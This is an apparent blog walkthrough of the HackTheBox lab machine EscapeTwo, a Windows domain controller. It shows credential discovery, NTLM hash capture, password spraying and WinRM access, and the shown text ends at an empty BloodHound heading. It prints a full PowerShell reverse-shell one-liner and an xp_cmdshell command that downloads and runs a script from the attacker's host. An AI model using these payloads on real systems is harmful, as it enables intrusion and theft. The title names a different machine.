---
title: "HackTheBox EscapeTwo walkthrough"
summary: "A Windows Active Directory machine involving SMB share exposure, NTLM credential coercion, BloodHound-guided privilege escalation, shadow credentials abuse, and ADCS certificate exploitation leading to full domain compromise."
categories: ["HackTheBox","Blog"]
tags: ["HackTheBox","Windows","ActiveDirectory","MSSQL","BloodHound","ShadowCredentials","Certipy"]
date: 2026-06-04
draft: false

---
# HTB: Fluffy Walkthrough

---
## Machine Overview
- **Name:** EscapeTwo
- **OS:** Windows
- **Difficulty:** Easy

EscapeTwo is an easy difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. We leverage these credentials to access a file share containing a corrupted Excel document. By modifying its byte structure, we extract credentials. These are then sprayed across the domain, revealing valid credentials for a user with access to MSSQL, granting us initial access. System enumeration reveals SQL credentials, which are sprayed to obtain WinRM access. Further domain analysis shows the user has write owner rights over an account managing ADCS. This is used to enumerate ADCS, revealing a misconfiguration in Active Directory Certificate Services. Exploiting this misconfiguration allows us to retrieve the Administrator account hash, ultimately leading to complete domain compromise.

---

## Recon
We are provided wiith creds  rose / KxEPkKe6R8su

## nmap
```sh
❯ sudo nmap -sC -sV 10.129.10.28 -o nmap   
PORT     STATE SERVICE       VERSION  
53/tcp   open  domain        Simple DNS Plus  
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-05 15:06:14Z)  
135/tcp  open  msrpc         Microsoft Windows RPC  
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject:    
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL  
| Not valid before: 2025-06-26T11:46:45  
|_Not valid after:  2124-06-08T17:00:40  
|_ssl-date: 2026-06-05T15:07:39+00:00; +1s from scanner time.  
445/tcp  open  microsoft-ds?  
464/tcp  open  kpasswd5?  
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject:    
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL  
| Not valid before: 2025-06-26T11:46:45  
|_Not valid after:  2124-06-08T17:00:40  
|_ssl-date: 2026-06-05T15:07:39+00:00; +1s from scanner time.  
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM  
| ms-sql-info:    
|   10.129.10.28:1433:    
|     Version:    
|       name: Microsoft SQL Server 2019 RTM  
|       number: 15.00.2000.00  
|       Product: Microsoft SQL Server 2019  
|       Service pack level: RTM  
|       Post-SP patches applied: false  
|_    TCP port: 1433  
| ms-sql-ntlm-info:    
|   10.129.10.28:1433:    
|     Target_Name: SEQUEL  
|     NetBIOS_Domain_Name: SEQUEL  
|     NetBIOS_Computer_Name: DC01  
|     DNS_Domain_Name: sequel.htb  
|     DNS_Computer_Name: DC01.sequel.htb  
|     DNS_Tree_Name: sequel.htb  
|_    Product_Version: 10.0.17763  
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback  
| Not valid before: 2026-06-05T15:05:14  
|_Not valid after:  2056-06-05T15:05:14  
|_ssl-date: 2026-06-05T15:07:39+00:00; +1s from scanner time.  
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject:    
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL  
| Not valid before: 2025-06-26T11:46:45  
|_Not valid after:  2124-06-08T17:00:40  
|_ssl-date: 2026-06-05T15:07:39+00:00; +1s from scanner time.  
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject:    
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL  
| Not valid before: 2025-06-26T11:46:45  
|_Not valid after:  2124-06-08T17:00:40  
|_ssl-date: 2026-06-05T15:07:39+00:00; +1s from scanner time.  
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
| smb2-time:    
|   date: 2026-06-05T15:07:02  
|_  start_date: N/A
```
before nything else I generated hosts file to add to my host file
```sh
❯ nxc smb 10.129.10.28 --generate-hosts-file host  
SMB         10.129.10.28    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
❯ cat host  
10.129.10.28     DC01.sequel.htb sequel.htb DC01  
❯ cat host | sudo tee -a /etc/hosts  
10.129.10.28     DC01.sequel.htb sequel.htb DC01
```
### MSSQL
since we have cred, I trtied them
```sh
❯ mssqlclient.py rose:'KxEPkKe6R8su'@10.129.10.28  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Encryption required, switching to TLS  
[-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'rose'.  
❯ mssqlclient.py rose:'KxEPkKe6R8su'@10.129.10.28 -windows-auth  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Encryption required, switching to TLS  
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master  
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192  
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.  
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.  
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)  
[!] Press help for extra shell commands  
SQL (SEQUEL\rose  guest@master)>
```

I tries a couple of numeration commands
```sh
SQL (SEQUEL\rose  guest@master)> enable_xp_cmdshell  
ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.  
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.  
ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.  
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.  
SQL (SEQUEL\rose  guest@master)> enum_users  
UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID      
------------------   --------   ---------   ---------   -------------   ----------   -----      
dbo                  db_owner   sa          master      dbo             b'1         '   b'01'      
guest                public     NULL        NULL        guest           b'2         '   b'00'      
INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL      
sys                  public     NULL        NULL        NULL            b'4         '    NULL      
SQL (SEQUEL\rose  guest@master)> enum_impersonate  
execute as   database   permission_name   state_desc   grantee   grantor      
----------   --------   ---------------   ----------   -------   -------
```

I then tries capturing hashes using responder.
Start responder to listen on tun0
```sh
sudo responder -I tun0
```

Send a request using `xp_dirtree`
```sql
SQL (SEQUEL\rose  guest@master)> xp_dirtree \\10.10.15.179\share\doesnotexist  
subdirectory   depth   file      
------------   -----   ---- 

```
We get `sql_svc`'s hash 
```sh
[SMB] NTLMv2-SSP Client   : 10.129.10.28  
[SMB] NTLMv2-SSP Username : SEQUEL\sql_svc  
[SMB] NTLMv2-SSP Hash     : sql_svc::SEQUEL:74683cabf9441bd9:16854A94A2994484BB9527EF8A02D7AF:01010000000000008084476719F5DC01FA22B832D6C64A6C0000000002000800380051004300560001001E00570049004E002D0034004D004300580048004600330059003200390  
0440004003400570049004E002D0034004D004300580048004600330059003200390044002E0038005100430056002E004C004F00430041004C000300140038005100430056002E004C004F00430041004C000500140038005100430056002E004C004F00430041004C00070008008084476719F5DC01  
060004000200000008003000300000000000000000000000003000007257E87C537EBF122C7D4D1F3323DAE0DA95A347FA931E3D25CCC8A979F69E8B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100370039000  
000000000000000
```

cracking the hash
```sh
❯ hashcat sql_svc.hash ~/Documents/cybersec/wordlists/rockyou.txt  
hashcat (v7.1.2) starting in autodetect mode  
            
--[SNIP]--  
Session..........: hashcat                                   
Status...........: Exhausted  
Hash.Mode........: 5600 (NetNTLMv2)  
Hash.Target......: SQL_SVC::SEQUEL:74683cabf9441bd9:16854a94a2994484bb...000000  

```
Unfortunately we I was not able to crack the hash

I went back to enumerating mssql
```sh
SQL (SEQUEL\rose  guest@master)> enum_owner  
Database   Owner      
--------   -----      
master     sa         
tempdb     sa         
model      sa         
msdb       sa         
SQL (SEQUEL\rose  guest@master)> enum_db  
name     is_trustworthy_on      
------   -----------------      
master                   0      
tempdb                   0      
model                    0      
msdb                     1
```
checking which databases I can access
```sh
SQL (SEQUEL\rose  guest@master)> SELECT name FROM sys.databases WHERE HAS_DBACCESS(name) = 1;  
  
name        
------      
master      
tempdb      
msdb
```
CREATE PROCEDURE test_cmd WITH EXECUTE AS OWNER AS EXEC master.dbo.xp_cmdshell 'whoami';

### smb
I tested the creds with smb which work then went ahead to list shares
```sh
❯ nxc smb 10.129.10.28 -u rose -p 'KxEPkKe6R8su'  
SMB         10.129.10.28    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.10.28    445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su    
❯ nxc smb 10.129.10.28 -u rose -p 'KxEPkKe6R8su' --shares  
SMB         10.129.10.28    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.10.28    445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su    
SMB         10.129.10.28    445    DC01             [*] Enumerated shares  
SMB         10.129.10.28    445    DC01             Share           Permissions     Remark  
SMB         10.129.10.28    445    DC01             -----           -----------     ------  
SMB         10.129.10.28    445    DC01             Accounting Department READ               
SMB         10.129.10.28    445    DC01             ADMIN$                          Remote Admin  
SMB         10.129.10.28    445    DC01             C$                              Default share  
SMB         10.129.10.28    445    DC01             IPC$            READ            Remote IPC  
SMB         10.129.10.28    445    DC01             NETLOGON        READ            Logon server share    
SMB         10.129.10.28    445    DC01             SYSVOL          READ            Logon server share    
SMB         10.129.10.28    445    DC01             Users           READ
```
Two share stand out `Accounting Department` and `Users` which I have read permission
1. Accounting Department
```sh
❯ smbclient '\\10.129.10.28\Accounting Department' -U 'rose'  
  
Password for [WORKGROUP\rose]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Sun Jun  9 13:52:21 2024  
 ..                                  D        0  Sun Jun  9 13:52:21 2024  
 accounting_2024.xlsx                A    10217  Sun Jun  9 13:14:49 2024  
 accounts.xlsx                       A     6780  Sun Jun  9 13:52:07 2024  
  
               6367231 blocks of size 4096. 925576 blocks available  
smb: \> download accounting_2024.xlsx  
download: command not found  
smb: \> get accounting_2024.xlsx  
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)  
smb: \> get accounts.xlsx  
getting file \accounts.xlsx of size 6780 as accounts.xlsx (1.9 KiloBytes/sec) (average 1.3 KiloBytes/sec)  
smb: \>
```
There are two file which I downloaded to view in my machine
Cheking the file in scel they reveal unreadable content, could be corup
Since xlsx file are basically zip file i extracted them to view the info which is normally located in`/xl/sharedStrings.xml`
Extracting the files
```sh
❯ unzip accounting_2024.xlsx  -d accounting_2024  
Archive:  accounting_2024.xlsx  
file #1:  bad zipfile offset (local header sig):  0  
 inflating: accounting_2024/_rels/.rels     
 inflating: accounting_2024/xl/workbook.xml     
 inflating: accounting_2024/xl/_rels/workbook.xml.rels     
 inflating: accounting_2024/xl/worksheets/sheet1.xml     
 inflating: accounting_2024/xl/theme/theme1.xml     
 inflating: accounting_2024/xl/styles.xml     
 inflating: accounting_2024/xl/sharedStrings.xml     
 inflating: accounting_2024/xl/worksheets/_rels/sheet1.xml.rels     
 inflating: accounting_2024/xl/printerSettings/printerSettings1.bin     
 inflating: accounting_2024/docProps/core.xml     
 inflating: accounting_2024/docProps/app.xml
 
 ❯ unzip accounts.xlsx  -d accounts  
Archive:  accounts.xlsx  
file #1:  bad zipfile offset (local header sig):  0  
 inflating: accounts/xl/workbook.xml     
 inflating: accounts/xl/theme/theme1.xml     
 inflating: accounts/xl/styles.xml     
 inflating: accounts/xl/worksheets/_rels/sheet1.xml.rels     
 inflating: accounts/xl/worksheets/sheet1.xml     
 inflating: accounts/xl/sharedStrings.xml     
 inflating: accounts/_rels/.rels       
 inflating: accounts/docProps/core.xml     
 inflating: accounts/docProps/app.xml     
 inflating: accounts/docProps/custom.xml     
 inflating: accounts/[Content_Types].xml
```

Viewing content
```sh
❯ cat accounting_2024/xl/sharedStrings.xml  
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>  
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="28" uniqueCount="27"><si><t>Date</t></si><si><t>Invoice Number</t></si><si><t>Description</t></si><si><t>Amount</t></si><si><t>Due Date</t></si><si><t>Status</  
t></si><si><t>Notes</t></si><si><t>1001</t></si><si><t>1002</t></si><si><t>1003</t></si><si><t>Office Supplies</t></si><si><t>Consulting</t></si><si><t>Software</t></si><si><t>01/15/2024</t></si><si><t>01/30/2024</t></si><si><t>02/05/202  
4</t></si><si><t>Paid</t></si><si><t>Unpaid</t></si><si><t>Follow up</t></si><si><t>23/08/2024</t></si><si><t>150$</t></si><si><t>500$</t></si><si><t>300$</t></si><si><t>Vendor</t></si><si><t>Dunder Mifflin</t></si><si><t>Business Consul  
tancy</t></si><si><t>Windows Server License</t></si></sst>%   
❯ cat accounts/xl/sharedStrings.xml  
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>  
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24">  
   <si>  
       <t xml:space="preserve">First Name</t>  
   </si>  
   <si>  
       <t xml:space="preserve">Last Name</t>  
   </si>  
   <si>  
       <t xml:space="preserve">Email</t>  
   </si>  
   <si>  
       <t xml:space="preserve">Username</t>  
   </si>  
   <si>  
       <t xml:space="preserve">Password</t>  
   </si>  
   <si>  
       <t xml:space="preserve">Angela</t>  
   </si>  
   <si>  
       <t xml:space="preserve">Martin</t>  
   </si>  
   <si>  
       <t xml:space="preserve">angela@sequel.htb</t>  
   </si>  
   <si>  
       <t xml:space="preserve">angela</t>  
   </si>  
   <si>  
       <t xml:space="preserve">0fwz7Q4mSpurIt99</t>  
   </si>  
   <si>  
       <t xml:space="preserve">Oscar</t>  
   </si>  
   <si>  
       <t xml:space="preserve">Martinez</t>  
   </si>  
   <si>  
       <t xml:space="preserve">oscar@sequel.htb</t>  
   </si>  
   <si>  
       <t xml:space="preserve">oscar</t>  
   </si>  
   <si>  
       <t xml:space="preserve">86LxLBMgEWaKUnBG</t>  
   </si>  
   <si>  
       <t xml:space="preserve">Kevin</t>  
   </si>  
   <si>  
       <t xml:space="preserve">Malone</t>  
   </si>  
   <si>  
       <t xml:space="preserve">kevin@sequel.htb</t>  
   </si>  
   <si>  
       <t xml:space="preserve">kevin</t>  
   </si>  
   <si>  
       <t xml:space="preserve">Md9Wlq1E5bZnVDVo</t>  
   </si>  
   <si>  
       <t xml:space="preserve">NULL</t>  
   </si>  
   <si>  
       <t xml:space="preserve">sa@sequel.htb</t>  
   </si>  
   <si>  
       <t xml:space="preserve">sa</t>  
   </si>  
   <si>  
       <t xml:space="preserve">MSSQLP@ssw0rd!</t>  
   </si>  
</sst>%
```

accounts reaveled some user data
```sh
angela     : 0fwz7Q4mSpurIt99
oscar      : 86LxLBMgEWaKUnBG  
kevin      : Md9Wlq1E5bZnVDVo
sa         : MSSQLP@ssw0rd!
```
`sa`  was a user in mssql so this is my brakthorug

## Initial foothold
### MSSQL as sa
I logged in now to mssql as sa
```sh
❯ mssqlclient.py sa:'MSSQLP@ssw0rd!'@10.129.10.28 -windows-auth  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Encryption required, switching to TLS  
[-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.  
  
❯ mssqlclient.py sa:'MSSQLP@ssw0rd!'@10.129.10.28  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Encryption required, switching to TLS  
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master  
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192  
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.  
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.  
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)  
[!] Press help for extra shell commands  
SQL (sa  dbo@master)> enable_xp_cmdshell  
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.  
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.  
SQL (sa  dbo@master)>
```
Windows auth did not succeed but switching to local-auth worked
I then enabled xp_cmdshell which would allow us to execute commands
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
Now I could eecute commands
```sh
SQL (sa  dbo@master)> EXEC xp_cmdshell 'whoami';  
  
output              
--------------      
sequel\sql_svc      
NULL
```

## Shell as sql_svc
Now that we can execute commands I created a ps1 script to get a reverse shell
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.15.179',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Then started a listener 
```sh
nc -lvnp 4444
```
Execute the shell
```sql
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.15.179:8000/rev.ps1'')"';
```

 get a shell
 ```sh
 ❯ nc -lvnp 4444  
Listening on 0.0.0.0 4444  
Connection received on 10.129.10.28 63227  
whoami  
sequel\sql_svc  
PS C:\Windows\system32>    
PS C:\Windows\system32>
 ```
 Checking privileges I get nothing worth exploring
 ```powershell
 PS C:\Windows\system32> whoami /all  
  
USER INFORMATION  
----------------  
  
User Name      SID                                            
============== ============================================  
sequel\sql_svc S-1-5-21-548670397-972687484-3496335370-1122  
  
  
GROUP INFORMATION  
-----------------  
  
Group Name                                 Type             SID                                                             Attributes                                                        
========================================== ================ =============================================================== ===============================================================  
Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group                
BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group                
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group                
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                                    Mandatory group, Enabled by default, Enabled group                
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group                
CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group                
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group                
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group                
NT SERVICE\MSSQL$SQLEXPRESS                Well-known group S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133 Enabled by default, Enabled group, Group owner                    
LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group                
Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group                
SEQUEL\SQLServer2005SQLBrowserUser$DC01    Alias            S-1-5-21-548670397-972687484-3496335370-1128                    Mandatory group, Enabled by default, Enabled group, Local Group  
SEQUEL\SQLRUserGroupSQLEXPRESS             Alias            S-1-5-21-548670397-972687484-3496335370-1129                    Mandatory group, Enabled by default, Enabled group, Local Group  
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                                                      
  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State      
============================= ============================== ========  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled    
SeCreateGlobalPrivilege       Create global objects          Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled  
  
  
USER CLAIMS INFORMATION  
-----------------------  
  
User claims unknown.  
  
Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
### Discovering mssql configuration folder
ENumerating the `C:` I found a sql configuration file with a new password
```powershell
PS C:\> dir  
  
  
   Directory: C:\  
  
  
Mode                LastWriteTime         Length Name                                                                     
----                -------------         ------ ----                                                                     
d-----        11/5/2022  12:03 PM                PerfLogs                                                                 
d-r---         1/4/2025   7:11 AM                Program Files                                                            
d-----         6/9/2024   8:37 AM                Program Files (x86)                                                      
d-----         6/8/2024   3:07 PM                SQL2019                                                                  
d-r---         6/9/2024   6:42 AM                Users                                                                    
d-----         1/4/2025   8:10 AM                Windows                                                                  
  
  
PS C:\> cd SQL2019  
PS C:\SQL2019> dir  
  
  
   Directory: C:\SQL2019  
  
  
Mode                LastWriteTime         Length Name                                                                     
----                -------------         ------ ----                                                                     
d-----         1/3/2025   7:29 AM                ExpressAdv_ENU                                                           
  
  
PS C:\SQL2019> cd ExpressAdv_ENU  
PS C:\SQL2019\ExpressAdv_ENU> dir  
  
  
   Directory: C:\SQL2019\ExpressAdv_ENU  
  
  
Mode                LastWriteTime         Length Name                                                                     
----                -------------         ------ ----                                                                     
d-----         6/8/2024   3:07 PM                1033_ENU_LP                                                              
d-----         6/8/2024   3:07 PM                redist                                                                   
d-----         6/8/2024   3:07 PM                resources                                                                
d-----         6/8/2024   3:07 PM                x64                                                                      
-a----        9/24/2019  10:03 PM             45 AUTORUN.INF                                                              
-a----        9/24/2019  10:03 PM            788 MEDIAINFO.XML                                                            
-a----         6/8/2024   3:07 PM             16 PackageId.dat                                                            
-a----        9/24/2019  10:03 PM         142944 SETUP.EXE                                                                
-a----        9/24/2019  10:03 PM            486 SETUP.EXE.CONFIG                                                         
-a----         6/8/2024   3:07 PM            717 sql-Configuration.INI                                                    
-a----        9/24/2019  10:03 PM         249448 SQLSETUPBOOTSTRAPPER.DLL                                                 
  
  
PS C:\SQL2019\ExpressAdv_ENU> type SETUP.EXE.CONFIG  
<?xml version="1.0" encoding="utf-8" ?>  
<configuration>  
 <startup>  
   <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.6"/>  
 </startup>  
 <runtime>  
   <loadFromRemoteSources enabled="true" />  
   <legacyCorruptedStateExceptionsPolicy enabled="true" />  
   <AppContextSwitchOverrides value="Switch.UseLegacyAccessibilityFeatures=false;Switch.UseLegacyAccessibilityFeatures.2=false;Switch.UseLegacyAccessibilityFeatures.3=false"/>  
 </runtime>  
</configuration>  
PS C:\SQL2019\ExpressAdv_ENU> type sql-Configuration.INI  
[OPTIONS]  
ACTION="Install"  
QUIET="True"  
FEATURES=SQL  
INSTANCENAME="SQLEXPRESS"  
INSTANCEID="SQLEXPRESS"  
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"  
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"  
AGTSVCSTARTUPTYPE="Manual"  
COMMFABRICPORT="0"  
COMMFABRICNETWORKLEVEL=""0"  
COMMFABRICENCRYPTION="0"  
MATRIXCMBRICKCOMMPORT="0"  
SQLSVCSTARTUPTYPE="Automatic"  
FILESTREAMLEVEL="0"  
ENABLERANU="False"    
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"  
SQLSVCACCOUNT="SEQUEL\sql_svc"  
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"  
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"  
SECURITYMODE="SQL"  
SAPWD="MSSQLP@ssw0rd!"  
ADDCURRENTUSERASSQLADMIN="False"  
TCPENABLED="1"  
NPENABLED="1"  
BROWSERSVCSTARTUPTYPE="Automatic"  
IAcceptSQLServerLicenseTerms=True  
PS C:\SQL2019\ExpressAdv_ENU>
```

Since we currently logged in as `sql_svc` lets try spraying the password against other users

### Password spraying
We need to first get a list of users. ldap should do it
```sh
❯ nxc ldap 10.129.10.28 -u oscar -p '86LxLBMgEWaKUnBG' --users  
^CLDAP        10.129.10.28    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb) (signing:None) (channel binding:Never)    
LDAP        10.129.10.28    389    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG    
LDAP        10.129.10.28    389    DC01             [*] Enumerated 9 domain users: sequel.htb  
LDAP        10.129.10.28    389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                                  
LDAP        10.129.10.28    389    DC01             Administrator                 2024-06-08 19:32:20 0        Built-in account for administering the computer/domain         
LDAP        10.129.10.28    389    DC01             Guest                         2024-12-25 17:44:53 1        Built-in account for guest access to the computer/domain       
LDAP        10.129.10.28    389    DC01             krbtgt                        2024-06-08 19:40:23 1        Key Distribution Center Service Account                        
LDAP        10.129.10.28    389    DC01             michael                       2024-06-08 19:47:37 1                                                                       
LDAP        10.129.10.28    389    DC01             ryan                          2024-06-08 19:55:45 0                                                                       
LDAP        10.129.10.28    389    DC01             oscar                         2024-06-08 19:56:36 2                                                                       
LDAP        10.129.10.28    389    DC01             sql_svc                       2024-06-09 10:58:42 0                                                                       
LDAP        10.129.10.28    389    DC01             rose                          2024-12-25 17:44:54 16                                                                      
LDAP        10.129.10.28    389    DC01             ca_svc                        2026-06-05 20:57:29 0                                                                       
❯ nano ldap-out.txt  
❯ nano ldap-out.txt  
❯ cat ldap-out.txt  
LDAP        10.129.10.28    389    DC01             Administrator                 2024-06-08 19:32:20 0        Built-in account for administering the computer/domain         
LDAP        10.129.10.28    389    DC01             Guest                         2024-12-25 17:44:53 1        Built-in account for guest access to the computer/domain       
LDAP        10.129.10.28    389    DC01             krbtgt                        2024-06-08 19:40:23 1        Key Distribution Center Service Account                        
LDAP        10.129.10.28    389    DC01             michael                       2024-06-08 19:47:37 1                                                                       
LDAP        10.129.10.28    389    DC01             ryan                          2024-06-08 19:55:45 0                                                                       
LDAP        10.129.10.28    389    DC01             oscar                         2024-06-08 19:56:36 2                                                                       
LDAP        10.129.10.28    389    DC01             sql_svc                       2024-06-09 10:58:42 0                                                                       
LDAP        10.129.10.28    389    DC01             rose                          2024-12-25 17:44:54 16                                                                      
LDAP        10.129.10.28    389    DC01             ca_svc                        2026-06-05 20:57:29 0     
❯ cat ldap-out.txt | awk '{print $5 }'  
Administrator  
Guest  
krbtgt  
michael  
ryan  
oscar  
sql_svc  
rose  
ca_svc  
❯ cat ldap-out.txt | awk '{print $5 }' > users.txt  
```
Using nxc to spray the password
```sh
❯ nxc smb 10.129.10.28 -u users.txt -p 'WqSZAF6CysDQbGb3'  
SMB         10.129.10.28    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.10.28    445    DC01             [-] sequel.htb\Administrator:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE    
SMB         10.129.10.28    445    DC01             [-] sequel.htb\Guest:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE    
SMB         10.129.10.28    445    DC01             [-] sequel.htb\krbtgt:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE    
SMB         10.129.10.28    445    DC01             [-] sequel.htb\michael:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE    
SMB         10.129.10.28    445    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3
```
We get a hit on ryan
We can  now winrm as ryan

## Winrm as Ryan

```sh
❯ evil-winrm -i 10.129.10.28 -u ryan -p 'WqSZAF6CysDQbGb3'  
/usr/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
/usr/lib/ruby/gems/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami  
sequel\ryan  
*Evil-WinRM* PS C:\Users\ryan\Documents> type ..\Desktop\user.txt  
72fac61233828da67aa9ffee2baef700  
*Evil-WinRM* PS C:\Users\ryan\Documents>
```

We get a shell as ryan and user flag


### bloodound
